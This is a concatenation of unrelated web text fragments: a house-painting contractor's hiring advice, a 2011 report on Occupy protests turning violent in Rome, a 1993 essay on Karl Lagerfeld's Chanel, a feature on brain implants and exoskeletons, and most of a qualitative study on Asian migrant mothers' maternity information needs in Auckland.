You can easily check for reliability by searching for complaints recorded by the Better Business Bureau (BBB).</span></p>   <p><strong>Payment On Completion:</strong><span> When choosing painting contractors you also need to be sure that the company you choose is financially sound and does not require advance payment to be made in full. We require 50% up front and remaining on&#xa0;completion. Payment will never be requested &#xa0;in&#xa0;full by The Contractor inc, until we know that you are totally satisfied with a quality of work done by us on your project, which has been completed to meet your standards and requirements.</span></p>   <p><strong>Payment Methods:</strong><span> Be sure that the local house painter / contractors you choose will accept payment by credit card. Claiming a refund is going to be less easy if you make a direct payment using cash or a check or by money transfer. For any local house painting project that has not been finished, and in a case where the completed project is obviously of poor quality, then it is a much simpler process for making a claim to get your money back through a credit card account.</span></p>   <p><strong>Experience:</strong><span> Reputable local house painter will be able to provide proof of their qualifications and experience. Ask to see written documentation of how long they have been in business and how many painting jobs they have completed. At The Contractor Inc, we have evidence of more than 50,000 painting projects completed in the last 14 years.</span></p>   <p><strong>Professional Skills and Qualifications:</strong><span> Check the skills and knowledge of the local house painter before you reach your decision. You can ask about the methods they use for exterior and interior painting projects. Painting contractors who are truly professional will not mind talking to you in detail about each stage of your painting project. At The Contractor Inc Dallas Fort Worth, we have the required knowledge, skills and expertise for all types of painting project.</span></p>   <div>    <p>New flooring And Paint Handyman local house painter contractor</p>   </div>   <h3>The main things to look for in a painter</h3>   <p><span>local house painter</span></p>   <p>When you are hiring professional local house painter or contractors, you are allowing them to enter your home, or to come to your place of business.

   <article>   <h1>Rome in flames as &#x2018;global day of revolution&#x2019; sees Wall Street protests spread across the world</h1>   <div>    <p>Violence erupts in Rome as Occupy Wall Street protests spread to hundreds of cities Protesters to march on New York&#x2019;s Times Square today Giulianai says he would stopped protesters sleeping on street</p>    <p>Last updated at 6:27 PM on 15th October 2011    <p>Demonstrators rallied on Saturday across the world to accuse bankers and politicians of wrecking economies, but only in Rome did the global &#x2018;day of rage&#x2019; erupt into violence.</p>    <p>Protesters there smashed shop windows and torched cars as violence broke out during a demonstration in the Italian capital.</p>    <p>Black smoke billowed into the air in downtown Rome as a small group of violent protesters broke away from the main demonstration. </p>    <p>They smashed car windows, set at least two vehicles on fire and assaulted two news crews of Sky Italia, the TV reported. Others burned Italian and European Union flags.</p>    <p> Danger: A protester hurls a canister towards police next to a burning car during clashes in Rome as Occupy Wall Street goes global and violent</p>    <p> Italy: Protesters hurl objects at police in Rome as well as smashing shop windows and torching cars during a demonstration in the Italian capital</p>    <p> Drastic measures: Police officers fire tear gas in Rome after the Occupy Wall Street protests turned violent today in the Italian capital </p>    <p> Violence: A demonstrator hits a photojournalist during a demonstration of the &#x2018;Indignant&#x2019; group against banking and finance in Rome today as another hurls a bottle at police GIULIANI: I WOULD HAVE TOLD PROTESTERS STEETS ARE NOT FOR SLEEPING</p>    <p>Former New York City mayor Rudy Giuliani has said that he would have told the Occupy Wall Street protesters that they were not allowed to sleep on the streets.</p>    <p>&#x2018;Well I had a rule and I enforced it as best I could and pretty effectively,&#x2019; he told Sean Hannity on Fox News. &#x2018;The rule was: You&#x2019;re not allowed to sleep on the streets. Sorry, not allowed to sleep on the streets. Streets are not for sleeping.&#x2019;</p>    <p>&#x2018;Sleeping on the streets is a dysfunctional act. It harms the person, it harms society, it leads to unsanitary conditions that affect public health,&#x2019; added mayor Bloomberg&#x2019;s predecessor who served as mayor between 1994 and 2001.</p>    <p>&#x2018;The first one who decided to sleep there should have been removed and then the second one, and the third one, and the fourth one and the fifth one. &#x2018;They can protest during the daytime if they want to, but if you want to stay over in New York City overnight, you got to rent a room, and if you&#x2019;re homeless we got plenty of shelters for you.&#x2019;</p>    <p>Italian police fired tear gas and water cannons as protesters who had smashed shop and bank windows, torched cars and hurled bottles.</p>    <p>It came a day after Premier Silvio Berlusconi barely survived a confidence vote. Italy, with a national debt ratio second only to Greece in the 17-nation eurozone, is rapidly becoming a focus of concern in Europe&#x2019;s debt crisis.</p>    <p>&#x2018;People of Europe: Rise Up!&#x2019; read a banner in Rome. Some peaceful demonstrators turned against the violent group and tried to stop them, hurling bottles at them, Sky and the ANSA news agency reported.

   <div>   <p><em>Kaiser Karl&#x2019;s cul-de-sac: For ten years, Karl Lagerfeld has ruled international fashion. He made Chanel the status label for the Eighties, then took on every other spare label in sight. But now, the spirit of Coco Chanel is back in fashion, and Karl seems to have lost the&#xa0;plot</em></p>   <p><strong>The Independent |&#xa0;Sunday, 29 August&#xa0;1993</strong></p>   <p><strong>by Marion Hume&#xa0;</strong></p>   <p>IN 1926, Jean Cocteau dashed off a simple sketch that summed up the state of fashion at a glance. In the foreground, a slender woman slouches comfortably in a simple jersey dress with only a squiggle of jewellery, while in the distance, a lumpen woman in a floor-length, fur-trimmed coat drags herself off the page and into history. &#x2018;Poiret s&#x2019;eloigne &#x2013; Chanel arrive,&#x2019; Cocteau scribbled on the bottom of the drawing: Poiret &#x2013; the favourite designer of the early Twenties &#x2013; leaves and Chanel&#xa0;arrives.</p>   <p>And so she did, and went on &#x2013; as we all know &#x2013; to change the way women dress forever. When she cut a man&#x2019;s pullover down the front, trimmed it with ribbon and shrugged it on because she was feeling chilly in Deauville, Coco Chanel was just making herself comfortable. But it was the beginning of a design revolution and the simple cardigan jackets with the high-cut armholes, those supple suits made from the men&#x2019;s underwear jersey, encouraged women around the world to ease up,&#xa0;too.</p>   <p>If Cocteau were drawing today, it would be Karl Lagerfeld who was leaving. The modern woman in the foreground would be wearing something by, say, Ann Demeulemeester, or Calvin Klein, Martin Margiela or Rei Kawakubo. The woman in the background, however, would be wearing a scarcely recognisable classic Chanel jacket over a white shirt slung about with gold belts, a black tie, wrinkled leggings, Chanel-insignia furry snow boots, chain-handled quilted bag, CC choker, padlock pendant . . . so many bits and pieces, the back view could only be a&#xa0;relief.</p>   <p>For we are not now in a Chanel moment, or at least in a Chanel-Lagerfeld moment. We have been, all the way through the Eighties, which in fashion terms concluded with the spring/summer 1992 collections. But now the Chanel suit, with its gob-stopper gold buttons and boxy little jacket, looks as incorrect as a fur coat, and Karl Lagerfeld, who has always hurtled forward, suddenly looks like he&#x2019;s stumbling down a&#xa0;cul-de-sac.</p>   <p>In the mid-Eighties, Lagerfeld&#x2019;s Chanel shows, which took the breezy cream and navy dressing of Coco&#x2019;s Deauville as their starting point, were delightful. By the late Eighties, they were sensational. Abbreviated suits in acidic colours, smothered in gold insignia, came marching down the catwalk to jarring vocals chanting &#x2018;I am a very very rich girl . . .&#x2019; The clothes were gutsy, they were exuberant and, whether one liked or loathed them, they were right for the&#xa0;times.</p>   <p>But the times moved and Karl shot off on his tangent. In March this year, after the autumn/winter ready-to-wear shows for Chanel, Chloe, Fendi and Lagerfeld (all designed by Karl, and mostly monstrous) Women&#x2019;s Wear Daily, the powerful fashion trade paper, wrote &#x2018;The Lagerfeld juggernaut has stalled.&#x2019; At last month&#x2019;s Chanel haute couture show, it showed no further sign of&#xa0;revival.</p>   <p>Out came micro-skirts over wobbling buttocks; waspish corsets that pushed breasts inwards and upwards so they jiggled like jellies on a plate, and gilded tweed bras (hands up who needs one). The show had begun with mock-<b>iron</b> <b>gates</b> thrust open at the head of the catwalk. At the end the <b>gates</b> were banged shut and padlocked. Then came an announcement: &#x2018;You cannot go backstage. Mr Lagerfeld will be available shortly to receive your congratulations in the courtyard outside.&#x2019; Apart from some Japanese film crews, always keen for a quote, there wasn&#x2019;t much of a&#xa0;queue.</p>   <p>All the signs are that Lagerfeld, who is said to spend a lot of time watching MTV in any one of the splendid 18th-century residences&#xa0;he has acquired, has lost the plot. Looking at MTV, you can understand why. Black rappers, with their oversized clothes, heavy gold chains, belts and optional guns, seem to have become muddled in his creative mind with the old Chanel classics. In the past, &#x2018;the street&#x2019; has given Lagerfeld just a touch of inspiration; this time it seems to have overwhelmed him as he has attempted to translate young black style into fashion for the bourgeois white customer. The gap between rich and poor has grown larger, and the symbol of Lagerfeld&#x2019;s Chanel &#x2013; all those crossed CCs that came to stand for conspicuous consumption &#x2013; have been replaced by PCs. Politically Correct Lagerfeld is&#xa0;not.</p>   <p>&#x2018;One might just as well tie a cheque around one&#x2019;s neck&#x2019; Coco Chanel once said of women who wore huge diamond solitaires. She might have said the same about Lagerfeld&#x2019;s&#xa0;suits.</p>   <p>The irony is that, as Lagerfeld&#x2019;s influence wanes, it is the spirit of Coco Chanel which has arrived in fashion once more. Very much her own woman, Chanel had more on her daily agenda than keeping tricksy clothes in place. She cut her own fringe, pulled on a Breton fisherman&#x2019;s jacket, wide pants and a T-shirt, tied a ribbon round her hair, slung on a string of pearls, stuffed her hands in her pockets and got on with her day. And that style, which mixed the readily available with the extraordinary, is in tune with the current &#x2018;magpie&#x2019; school of dressing. After the fall of the short skirt and the loosening up of cut and shape, women are wearing comfortable clothes that make them feel feminine, modern, and in control of their sexuality. They are more confident about putting together their own style piecemeal, less concerned with&#xa0;status.</p>   <p>ONE SHOULDN&#x2019;T forget, however, Lagerfeld&#x2019;s enormous contribution to fashion &#x2013; the greatest of which was that he took over the house of Chanel and shook it up. For almost 10 years he was probably the most&#xa0;influential</p>   <p>designer in the world. And while he can no longer be considered centre-stage, there is no sign that the Wertheimer family, which owns&#xa0;the Chanel name and employs Lagerfeld&#xa0;under contract, are still anything less than&#xa0;happy with&#xa0;him.</p>   <p>When he took over at Chanel in 1983, Lagerfeld told the fashion journalist Suzy Menkes, then of the Times: &#x2018;I am a kind of fashion computer.&#x2019; Ten years later, who could doubt the truth of it? By then, 54 years old, he was designing two collections for Fendi, two for Chanel haute couture, two for Chanel pret- a-porter, two Chanel cruisewear collections for America, two collections for Chloe, two for the Karl Lagerfeld label, two for Karl Lagerfeld Cruise as well as overseeing the mass-market label, KL, and photographing advertising campaigns for Chanel and Karl Lagerfeld as well as other clients including Mercedes Benz. Is it hardly surprising that, finally, he seems to have overreached&#xa0;himself.</p>   <p>But if Lagerfeld&#x2019;s power is slipping, Chanel, under the Wertheimers, is simply shifting its emphasis. Even if the basic suit been exploited almost to death, there is always that other treasure trove to plunder, the inspirational Chanel jewellery. This was the way Coco Chanel gave even the simplest suit a dash of individuality and&#xa0;splendour.</p>   <p>A new book by Patrick Mauries, published next month, focuses on Coco&#x2019;s jewellery creations and ignores Karl Lagerfeld. In researching the well-worn ground (there have been hundreds of books about Chanel) Mauries has pulled out some of the lesser-known photographs, as well as charming illustrations by Eric for Vogue, by Marcel Vertes for&#xa0;Harper&#x2019;s</p>   <p>Bazaar, by Christian Berard and Paul Iribe, and, most interestingly, he has included a previously unpublished portfolio of drawings by the prolific Jean Cocteau, recently discovered in an envelope marked&#xa0;&#x2018;Chanel&#x2019;.</p>   <p>Mauries&#x2019; scholarly book, unintentionally perhaps, reflects a shift in taste. Coco aficiandos &#x2013; those who have hated Lagerfeld&#x2019;s pillaging of her archive and have thus been at odds with fashion for almost a decade &#x2013; are reclaiming their territory. The emphasis is now on taste, pared-down dressing, quality, authenticity. And with simplicity to the fore, it is jewellery instead of accessories &#x2013; favourite pieces, whether precious or fake &#x2013; which move across a variety of clothes and give&#xa0;the modern woman a touch of ornament and individual&#xa0;style.</p>   <p>For years, fake was fashionable. Now the Chanel company&#x2019;s whispered plans to follow Mauries&#x2019; book later this year with the&#xa0;re-introducion of real jewellery, for the first time since 1937, suddenly starts to make some sense in these straightened&#xa0;times.</p>   <p>&#x2018;Jewellery by Chanel&#x2019; by Patrick Mauries is published on 6 Sept by Thames &amp;&#xa0;Hudson</p>  </div>

Not only will people possess superhuman intelligence and total recall, it could lead to the cancellation of TV quiz show Eggheads.</p>    <p>Already available are brain-computer interfaces (BCI) that link your mind to a PC for communication or to control devices such as wheelchairs. The technology was recently used by a group of disabled music fans who created the world&#x2019;s first dance track using their minds.</p>    <p>More intrusive are neural implants inserted inside your grey matter. Medical uses include treating diseases that affect motor function or providing an alternative to psychiatric drugs but these implants could also result in increased brain power and mind control.</p>    <p>Implants would also allow wireless connection to devices such as smartphones and games consoles. Professor Nikolas Rose of King&#x2019;s College London is the author of Neuro: The New Brain Sciences And The Management Of The Mind. He says: &#x2018;These implants involve the implantation of electrodes deep into different areas of the brain and the application of small electrical currents.</p>    <p>&#x2018;However, it&#x2019;s rather unproven and not at all clear how it works. The operation requires drilling a hole in the skull and a very precise location of electrodes, so it&#x2019;s not been carried out on the patient numbers required for full clinical trials. There is also a strong social, ethical and safety argument regarding their use.&#x2019;</p>    <p>However, the Kurzeil prophecy we&#x2019;re most excited about is nanobots in the bloodstream curing all diseases by 2030 and that we &#x2018;will be able to live without ageing&#x2019;.&#xa0;This nanotechnlogy has already been used successfully on mice. Animal testing is a charged subject but its proponents argue it is key to the rapid development of the genetic engineering that could turn us all into superhumans.</p>    <p>While &#x2018;playing God&#x2019; remains hugely controversial, many scientists are convinced it can be used to eradicate genetic diseases. Some say it could also create a boom in &#x2018;designer babies&#x2019;, where parents choose the sex, looks or even race of their child.</p>    <p>Leaving your insides well alone, how about becoming Iron Man with a powered exoskeleton? Besides the prospect of creating super-soldiers, these suits of tech armour could restore mobility to the disabled or simply help us go harder and faster for longer.</p>    <p>The &#xa3;90,000 Ekso is a 23kg titanium suit found in US hospitals that helps paralysed patients walk again. For half the price, Parker Hannifin&#x2019;s Indego and Argo Medical&#x2019;s ReWalk offer similar help for those with spinal injuries.</p>    <p>Defence giant Lockheed Martin has used the technology in its Human Universal Load Carrier (HULC), which is on the brink of being deployed for military use. It will allow a soldier to carry a 90kg load at 10mph over great distances.&#xa0;Paul Saffo, managing director of foresight at research firm Discern Analytics, recently told Bloomberg: &#x2018;The medical devices get the most attention, the military funds it and the first mass application is industrial.&#x2019;</p>    <p>Japanese company Cyberdyne has also engineered an exoskeleton which it has named HAL (Hybrid Assistive Limb), namesake of the killer computer from 2001: A Space Odyssey.&#xa0;The suit has been developed to help people in disaster zones move heavy equipment. Japanese hospitals are renting the suits for &#xa3;1,300 a month and a full-production model goes on sale soon.</p>    <p>And don&#x2019;t forget The Terminator. The robotic arm you thought John Connor destroyed is essentially the blueprint for replacement limbs with form and function.&#xa0;Suddenly The Six Billion Dollar Man and The Bionic Woman become a reality, with limbs responding to muscle movements or in conjunction with a brain-computer interface. (Future designs will even replicate the feel of what you&#x2019;re touching.)</p>    <figure>     <figcaption>      Nigel Auckland&#x2019;s prosthetic limb, the bebionic3 hand, has transformed his life.

People in the street don&#x2019;t really know how to react to the fact that you have no arm and, as a result, you can be left feeling exceptionally withdrawn.

When the consumer is a migrant who has experienced social upheaval, lost their knowledge resources and is experiencing isolation and language barriers, they may take up a more dependent role rather than the autonomous and self-determining consumer that midwives are prepared for. This imbalance can mean that health professionals are challenged to take up less facilitative and more authoritative positions and in turn migrant mothers and their partners are challenged to develop more proactive roles. This paper presents partial and preliminary findings from a qualitative study of Asian mothers in New Zealand with regard to their information needs.</p>   <p><strong>Introduction</strong> The notion of a partnership between the midwife and the woman underpins New Zealand midwifery models, where both parties are equal and make equally valuable contributions (Pairman, 2001). Midwives bring their knowledge, skills and experience and the woman brings her knowledge of herself and her family and her needs and wishes for her pregnancy and birth. However, for women become equal partners, they need to make informed decisions about their health and this in turn depends on having access to relevant and timely information. For mothers, biological knowledge about the pregnancy, birth and labour is only one form of knowledge. In addition, social knowledge and institutional knowledge are important (Lazarus, 1994). While biological knowledge can be obtained from authoritative sources like experts and electronic resources, social and institutional knowledge are more difficult to access for migrant women. AS access to these forms of knowledge is dependent on context and social networks which migrant mothers often lose in the social upheaval of migration. For many women who migrate, the separation from family and peers leads to &#x2018;breaks in knowledge&#x2019; (Fitzgerald et al., 1998) and the loss of these knowledge resources which help prepare the mother for the processes of pregnancy, childbirth and parenting, creates what Liem (1999, p.157) calls a &#x201c;vacuum of knowledge&#x201d;. The vacuum of knowledge needs to be filled and most often this role falls heavily on health professionals (DeSouza, 2005).</p>   <p>This paper begins with a description of the dramatic population changes in New Zealand with a particular focus on Asian women. A discussion about receiving accurate and timely information follows suggesting that the quality of communication between women and their carers is critical for feeling safe and satisfied with care. An outline of research conducted in <b>Auckland</b> New Zealand follows and the findings are presented through the transition to parenthood. Strategies for managing the transition to parenthood and becoming an informed consumer are discussed with the paper concluding with practice, policy and research recommendations.</p>   <p><strong>Literature Review</strong> The following section contextualises the study by reviewing the changing demographics in New Zealand society with a focus on Asian women. This is followed by a discussion about the link between information and communication and satisfaction with care for migrants.</p>   <p><strong>An increasingly diverse New Zealand</strong> Service providers need to develop skills and competence for working effectively with diverse members of New Zealand society. International trends show that people of diverse racial, ethno-cultural and language backgrounds are underserved by health and social services, experience unequal burdens of disease, experience cultural and language barriers to accessing appropriate health care, and receive a lower quality of care when they do access health care services in comparison with members of the population (Johnstone &amp; Kanitsaki, 2005). The 2001 Census revealed growing numbers of M&#x2423;ori (14.5%), Pacific Island people (5.6%), Chinese (2.2%) and Indian (1.2%), in addition to European/Pakeha who make up 79.6% of the population. There has been a 20% increase in the number of multilingual people and an increase in people whose religion was non-Christian. People who practice Hinduism increased by 56%, there was a 48% increase in Buddhists and a 74% of people practising Islam.</p>   <p>Asians are the fastest growing ethnic group; increasing by around 140% over the last ten years and predicted to increase by 122% by 2021 due to net migration gains rather than high fertility rates (Statistics New Zealand, 2005). The Asian community has the highest proportion of women (54%), (Scragg &amp; Maitra, 2005) who are most highly concentrated in the working age group of 15-64 years compared to other ethnic groups, a reflection of a skills focused migration policy. 23% of New Zealand women were born overseas, predominantly in the UK and Ireland, Asia and the Pacific Islands. Some of the most dramatic demographic changes are evident in the Asian community, for example in the period between 1991 and 2001, the number of women originating from the Republic of Korea increased 23 times from 408 to 9,354, numbers of women from China quadrupled from 4,620 to 20,457 and women from South Asia doubled in the same time period (Statistics New Zealand, 2005). Such diversity has been unprecedented and present both unique challenges and opportunities to health and social service providers and policy makers.</p>   <p><strong>Communication, caring and safety</strong> Migration often results in the loss of reference points in the form of family networks, peer support and familiarity with health services. Such a loss amplifies the necessity for receiving accurate and timely information. Davies and Bath (2001) suggest that information provision during pregnancy and childbirth is critical for both supporting choices that are made but also in preparing women to manage uncertain outcomes. Citing a study by Kirkham (1989), Davies and Bath argue that women&#x2019;s satisfaction with maternity services in secondary care is primarily dependent on the quality of communication between the women and their carers. Little is known about the health care experiences of migrant women, however, they are thought to report more acute concerns about communication and sensitivity of care than the population in general (Davies &amp; Bath, 2001). Furthermore, language barriers can exacerbate isolation and promote dependency on health workers rather than enhancing self- determination, a dominant midwifery discourse. Small, Rice, Yelland, &amp; Lumley (1999) found that Vietnamese, Turkish and Filipino women in Melbourne who were not fluent English speakers experienced problems in communicating with their caregivers and this made experiences of care less positive. Of more importance than knowledge about cultural practices, was care experienced as unkind, rushed, and unsupportive. Another Australian study found that migrant patients (and their families) did not feel safe when in hospital. Safety was undermined when effective communication with caregivers was compromised through being unable to access qualified health interpreters or being unable to have family members around to advocate and participate in decision-making (Johnstone &amp; Kanitsaki, 2005).</p>   <p><strong>The study</strong> Migrants tend to maintain better health than the local population initially so often have little to do with hospitals (McDonald &amp; Kennedy, 2004), but motherhood is a common aspect of migration requiring contact with the health system. The study took place in <b>Auckland</b>, New Zealand among White migrants (from South Africa, United Kingdom and the United States of America), Muslim Arab migrants (from Iraq and Palestine) and Asian women from three ethnic communities (Korean, Chinese and Indian) as part of a larger Families Commission funded study. Ethics approval was obtained from the <b>Auckland</b> University of Technology Ethics Committee and the Plunket Ethics Committee. Participants for the migrant mothers&#x2019; focus group were recruited though Plunket nurses who invited women to participate, selection criteria limited participation to migrant women who had become mothers within the last 12 months in New Zealand. Informed consent was obtained from all participants and consent forms were translated into Arabic, Korean and Chinese. Data collection involved focus groups using semi-structured interviews conducted in English, Chinese and Korean. The groups were facilitated by interviewers proficient in English and the language spoken by the women. These interviews were recorded and transcribed, translated into English if necessary and verified by an independent translator. The interview transcripts were then coded and analysed. The codes were clustered according to similarity and reduced. Similar phenomena were grouped into categories and named. The process was one of constant comparison, iteratively classifying and grouping the material to identify preliminary categories and sub- categories. This paper reports on a sub-theme about information needs and the findings focus on Asian women.</p>   <p><strong>Findings </strong> Midwives caring for migrant Asian parents are challenged to reconfigure their model of partnership and in turn migrant Asian parents experience a shift from birth being a social event to more of an individual responsibility. This shift requires a more proactive and self- sufficient role for women and their husbands, who become more involved than they might have been in their country of origin. In addition, language and communication drive experiences of care. This separation from knowledge resources places greater responsibility onto midwives to assume a more central role in information provision and support. In particular migrant mothers require detailed, individualised, stage specific information in order to take up the role of informed consumer.</p>   <p><strong>Antenatal period</strong> Not only are migrant mothers confronted with changing bodies and roles when they become pregnant, they also have to deal with an unfamiliar health system in the absence of a support network and knowledge resources they might have had in their countries of origin. In this study, Asian migrant women had to make decisions that required access to information in order to ascertain the choice of maternity carer and access to ante-natal classes. At this time women who were not fluent or confident English speakers had to contend with linguistic and cultural barriers to accessing services.</p>   <p>The loss of traditional sources of knowledge meant that pregnancy in a new country moved from being a social event and responsibility to being an individual one (DeSouza, 2005). This required the participants to become more involved and proactive in seeking out detailed, timely and specific information about the stages of their pregnancy. This allowed them to become more involved in the pregnancy than if they had been in their country of origin where this responsibility would have been shared. Husbands also became more involved in the processes of pregnancy, than they might have been in their countries of origin. Knowing where to begin the process was difficult:</p>   <p><em>I had no idea at all about the system here. It was through the pregnancy test kit that I found out I was pregnant, but did not know what the next step was. I wondered whether I had to show my test result to my GP. I had no knowledge of how to get the necessary information [Korean participant].</em></p>   <p>Obtaining language specific and precise information was important for many Korean women. Being given broad encouragement was not a substitute for specific information and was perceived as a laissez-fare attitude to their wellbeing.</p>   <p><em>I was given some information, but I didn&#x2019;t read it, as it was not in Korean. I always felt that I was one step behind. It was not only the midwife who did not give enough information or necessary support. Everyone kept saying, &#x201c;It is okay, you are doing well&#x201d; but gave few information or specific support [Korean participant].</em></p>   <p>Pregnancy in a new country raised the need to develop active decision making strategies and to choose a health care provider. Many of the women were proactive about finding out about the New Zealand health system and turned to authoritative sources for information:</p>   <p><em>Luckily, I was attending school and the assignment from school was to complete a project. I chose &#x2018;New Zealand&#x2019;s maternity system&#x2019; and that was how I got some ideas about my situation [Korean participant].</em></p>   <p>For some women the absence of family members and the access to information meant that they could monitor themselves through the stages of pregnancy and this led to developing increased knowledge and greater self-sufficiency:</p>   <p><em>I have to take care of my own self. I found this good thing in New Zealand that you should take care of the baby and you should be aware of foods and what is going on each and every month, each and every week, what really is important [Indian participant].</em></p>   <p>One Indian woman found that she was more engaged in her pregnancy because her previous pregnancy was a joint responsibility with other family members while this time round she had to take more personal responsibility:</p>   <p><em>Why didn&#x2019;t I get the feelings the first time? Time passed with families, mother in law, sisters, brothers and time passed like anything but here we are alone,&#xa0; thinking about the baby early and so every moment for me was a first time moment, even though I&#x2019;m a second time mother [Indian participant].</em></p>   <p>Many husbands become more involved during the pregnancy and were more in tune with what was happening to their partner&#x2019;s bodies:</p>   <p><em>We used to wake up and the first thing we used to do was take a book and read &#x2018;Okay, so now our baby&#x2019;s doing that&#x2019; and he will pat me on my tummy saying &#x2018;Oh my little one&#x2019; you know? So I doubt whether the same feeling would have come if my pregnancy was in India [Indian participant].</em></p>   <p>Language dictated the choice of LMC for many Chinese women and they, more than any other cohort, relied on their networks to find a care provider with Chinese newspapers also being a useful knowledge resource.</p>   <p><em>She speaks English and can speak Chinese. After I met her, I had a good impression of her. So I decided to have her as my midwife. My midwife has a partner who is also a Chinese (Malaysian Chinese). When I gave birth to my child, her partner delivered my child. The whole process was quite smooth [Chinese participant].</em></p>   <p><strong>Antenatal classes</strong> Antenatal classes were a pivotal mechanism for acquiring knowledge:</p>   <p><em>When you know something it&#x2019;s better than just going without knowledge and you&#x2019;re worried. , Yeah and as a first time mother I didn&#x2019;t really know what was going to happen or what to expect and then yeah, I learnt a lot from that [Indian participant].</em></p>   <p>And for gaining confidence about what was to come by having some broad knowledge about what was to come<em>:</em></p>   <p><em>I felt it was not so relevant to my delivery. But I felt more at ease and more confident during delivery. There are Chinese people in the class. The midwife was also careful when teaching us. We could understand her. My husband&#x2019;s English is very good. He escorted me to the class. It was about some basic ideas. I didn&#x2019;t find it useful for my delivery. During delivery, you follow the instructions of your midwife and have no time to reflect on what was taught in the class. But you feel relieved and less anxious. You roughly know what is going to happen and what is what [Chinese participant].</em></p>   <p>But language barriers made classes inaccessible for some:</p>   <p><em>I felt frustrated because I could not understand everything [Korean participant].</em></p>   <p><em>Both my husband and I have poor English so only attended once [Korean participant].</em></p>   <p>This section highlighted the importance of receiving detailed and specific information in one&#x2019;s own language and how this influences the choice of LMC or attendance at ante-natal classes. Knowing where to start can be difficult. For women and their husbands who want to take up an informed consumer role there are resources available which lead women and their husbands to be more self-sufficient, proactive and engaged in the process<strong>.</strong></p>   <p><strong>Labour and delivery</strong> Labour and delivery was also a time when information, support and cultural needs were highlighted. Women wanted information that was specific to their stage of labour and that was individualised (some felt they had too much and others too little information to feel that they could make the best choice for themselves). The value of specific stage by stage information was supported by a Korean participant rather than broad encouragement:</p>   <p><em>In Korea mums are given lots of warning and feedback of what is happening during labour, and told by Dr&#x2019;s what to do regularly. This was missing in NZ. It would be good to be given feedback of our progress of labour and how many cm we are at each stage after the vaginal examinations. I was not told this. Not enough explanation and only told that &#x201c;You are doing well&#x201d; [Korean participant].</em></p>   <p>The need for not only specific information but also to be told the best option or given enough information to make the best choice was also voiced. The facilitative role of health providers was called into question with some participants wanting a more authoritative role. The partnership between the midwife and the woman underpins the midwifery model in New Zealand maternity services and is based on equity and the acknowledgement that both parties make equally valuable contributions (Pairman, 2001). Midwives bring their knowledge, skills and experience and the woman brings her knowledge of herself and her family and her needs and wishes for her pregnancy and birth. Midwives have moved from authoritative sources of knowledge to models of partnership and collaboration in a bid to empower women and distinguish themselves from the more hierarchical professional models of medical, nursing and obstetric practise (Tully, Daellenbach, &amp; Guilliland, 1998). However, this is predicated on the notion of the informed consumer:</p>   <p><em>In NZ different delivery options are given to mums and we are asked to choose by ourselves but unable to choose the best options for ourselves due to lack of sufficient knowledge. Want more advice and guidance and even want to be told which better option for us is. So in the end we have limited options due to not enough knowledge of all the pros and cons of delivery methods [Korean participant].</em></p>   <p>Information does need to be individualised, one participant who felt that she was given too much information:</p>   <p><em>During the labour the ladies said that I need an epidural because I can&#x2019;t go through the pain anymore, the anaesthetist comes in the room and says out of 150 million there are 10% of cases with risk all that information beforehand [Indian Participant].</em></p>   <p>This section has highlighted the importance of detailed and specific information and the need for information to be individualised. The midwifery model of care which emphasises facilitative rather than authoritative relationships was challenged.</p>   <p><strong>Post-partum</strong> The postnatal period is a critical time for women but it is also a time when their needs are often not met (Baker, Choi, Henshaw, &amp; Tree, 2005). In the postpartum, information needs were an issue, women needed to know how to handle an unpredictable and unknown baby, there were issues around feeding from a cultural point of view and what to feed and when, the amount and type of information became important too:</p>   <p><em>We need more information. <b>Iron</b> deficiency for example. We don&#x2019;t know what to feed our babies for this. And solid feeding too. We don&#x2019;t know how to begin solid feeding with Korean food. The information is only on Kiwi way of feeding [Korean participant].</em> <em>I didn&#x2019;t even know how to care for her after delivering baby. No knowledge. Had to cook and clean and do everything after delivering baby , had no one to help. Breastfeeding was hard, received no help. Got sore bones and joints. No Korean appropriate services available, so often missed out altogether on information and the right kind of help [Korean participant].</em></p>   <p>However, not everyone wanted to be an informed consumer:</p>   <p><em>Yeah, you just want to get out of that place and these people are giving you like the advantages and disadvantages of various things, you don&#x2019;t want to hear all these things [Indian participant].</em></p>   <p>The post-partum period highlights the need for the expansion of the information agenda from New Zealand models of infant feeding to incorporating other cultural models and the need for language specific information about breastfeeding. Some women contested the pressure to be informed consumers. The following section provides some discussion and recommendations.</p>   <p><strong>Discussion</strong></p>   <p>This section focuses on five key areas where further exploration and consideration by both migrant mothers and health professionals would be beneficial, namely:</p>   <ul>    <li>Providing detailed and individualised information;</li>    <li>Language support;</li>    <li>Preparing women for new discourses of maternity;</li>    <li>Developing fluency; and Developing health literacy.</li>   </ul>   <p><strong>Providing detailed and individualised information</strong></p>   <p>Health-care providers have a responsibility to make available, accessible and up-to-date information. However this is not as easy as it sounds, when facilitating informed choice. Midwives and other health professionals are caught in a difficult position and have to strike other balances, such as between giving enough information for the woman to make a choice but not giving too much information and frightening her (Levy, 2006). They also have to delicately meet the needs of women and to appear neutral in their advice, when they might have strong feelings regarding certain issues. In this study, migrant mothers looked to health professionals to fill the vacuum of knowledge by being authoritative rather than facilitative. Increasingly research shows that information is more effective when it is tailored to the individual and their needs (Rapport et al., 2006) and relevant to the women&#x2019;s current stage of pregnancy (Benn, Budge, &amp; White, 1999). In addition detailed information rather than &#x2018;big picture&#x2019; was valued. Therefore highlighting the need for individualised and detailed information when planning for the provision of maternity information (Soltani &amp; Dickinson, 2005). Information that is available in ones own language or written information is important. While translated information is available about childbirth in New Zealand from the Maternity Services Consumer Council of New Zealand it is not clear how well this information is distributed or whether LMCs are aware of its existence.</p>   <p><strong>Language support</strong> Communication as a part of information support can be improved through implementing a two pronged strategy. First, health professionals and systems can become more skilful at information provision through linguistic competence and secondly through identifying and assisting in the extension of sources of information. Health providers can assist new migrants to identify information sources and encourage women to develop information seeking skills. Developing linguistic and cultural competence can be achieved by:</p>   <ul>    <li>Providing bilingual /bicultural staff;</li>    <li>Providing foreign language interpreting services; Having link workers/advocates; and&#xa0;&#xa0;&#xa0;&#xa0; Having materials developed and tested for specific cultural, ethnic, and linguistic groups;</li>    <li>Having translation services including those of:Legally binding documents (for example, consent forms); Hospital signage; Health education materials; and Public awareness materials and campaigns, including ethnic media in languages other than English. Examples include television, radio, internet, newspapers and periodicals (Szczepura, 2005).</li>   </ul>   <p>In the USA, health care organisations are required to both offer and provide language services such as bilingual staff and interpreter servicesat no extra cost to clients who require it. It is recommended that information about services is provided both in writing and in a timely manner with credentialed interpreters and bilingual workers available (U.S. Dept. of Health and Human Services, 2003).</p>   <p>Lastly, research is needed to assess the level of unmet information needs among new migrant women in greater depth. To borrow from a recommendation from a recent 